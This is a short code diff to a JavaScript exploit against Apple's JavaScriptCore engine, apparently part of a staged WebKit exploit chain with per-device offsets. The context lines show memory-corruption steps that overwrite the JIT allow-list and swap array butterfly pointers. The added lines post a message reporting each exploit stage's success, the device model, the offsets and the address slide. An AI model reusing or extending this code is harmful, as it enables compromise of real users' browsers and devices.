@@ -3245,6 +3245,13 @@ const device_chipset = {
         }
         write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
         write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
+        if (typeof self !== 'undefined' && self.postMessage) {
+            self.postMessage({
+                type: 'log_exploit_stage',
+                stage: 'stage1_module_complete',
+                data: {status: 'success', device_model, offsets, slide: slide.toString()}
+            });
+        }
         this.stage2();
         return true;
     }
@@ -3288,6 +3295,13 @@ const device_chipset = {
             const butterfly = this.read64(boxed_arr + 8n);
             this.write64(unboxed_arr + 8n, butterfly);
             print("Finished stage2 succesfully");
+            if (typeof self !== 'undefined' && self.postMessage) {
+                self.postMessage({
+                    type: 'log_exploit_stage',
+                    stage: 'stage2_module_complete',
+                    data: {status: 'success', device_model, offsets, slide: slide.toString()}
+                });
+            }
         }
         catch(e)
         {
